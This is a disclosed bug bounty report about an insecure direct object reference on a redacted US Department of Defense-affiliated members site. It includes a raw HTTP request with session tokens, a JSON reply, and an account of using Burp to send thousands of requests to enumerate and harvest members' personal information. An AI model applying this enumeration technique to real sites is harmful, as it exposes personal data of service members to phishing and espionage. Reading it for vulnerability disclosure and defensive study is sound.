# Members Personal Information Leak Due to IDOR

## Report Details
- **Report ID**: 847185
- **URL**: https://hackerone.com/reports/847185
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-04-11T08:57:20.181Z
- **Disclosed**: 2021-05-11T20:13:25.868Z

## Reporter
- **Username**: r00tpgp
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
##Summary
https://██████ allows anyone to sign up and view other members profile.  According to wikipedia,  ███████ is part of US DoD "████████":

██████

I signed up with a regular account and noticed that by referencing users `████`, I can send thousands of "█████████"  and also, using another end-point, view personal information of members. 

For eg. this person has all her private info displayed for any member:  https://█████/███████ her `██████████` is easily enumerated as `██████████`. 



███


Therefore,  using Burp, I can run this number to reveal more members:

##Request

POST /██████ HTTP/1.1
Host: ██████████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Authorization-Code: b6315c0b-3f28-4b63-93de-b6a5a1c3db82
Rest-Authorization-Code: b6315c0b-3f28-4b63-93de-b6a5a1c3db82
X-Requested-With: XMLHttpRequest
Content-Length: 35
Origin: https://█████████
Connection: close
Referer: https://██████/██████████
Cookie: _ga=██████ ███; ██████████-Http-Session=███; googtrans=/en/en; UserName=█████ █████; ████████

RequesteeId=████████&RequestMessage=+

##Reply:

{
  "████": {
    "CreatedDate": "2020-04-11T08:22:53.247",
    "██████████": "Pending",
    "LastModifiedDate": "2020-04-11T08:22:53.247",
    "RequestMessage": " ",
    "RequestorId": ██████████,
    "RequesteeId": █████████,
    "User": {
      "AvatarUrl": "https://█████████/cfs-file/__key/system/images/anonymous.gif",
      "DisplayName": "██████████",
      "ProfileUrl": "https://██████████/███████",
      "Username": "██████",
      "CurrentStatus": null,
      "Id": ████████
    },
    "Id": 74509
  },
  "Info": [],
  "Warnings": [],
  "Errors": []
}

## Browser Response

███


Not all members provide Personal Info to anyone, therefore, I used another endpoint to craft a simple message "█████████", I used Burp and send thousands of "██████" to different `█████████` and wait for them to accept:


##Request


███████

and I wait for those that accept my "██████████" and I should be able to see their Personal Info upon approval.

I can confirmed that they had received my request because, using the first end-point, their `█████████` is `Pending....`__after__ I had sent the "████".

## Impact

This technique can be used as a data harvesting method on ██████ website to retrieve members profile, I had noticed that many of the members are military personnel. Which can be of interest for terrorist or threat actors targeting US military personnel for phishing or espionage campaigns. 

##Fix
There should be some rate-limiting to the number of requests per end-point can receive from a single source ip addr or a reCAPTCHA after a few requests to stop attacker from harvesting members' profile.

## Attachments
No attachments
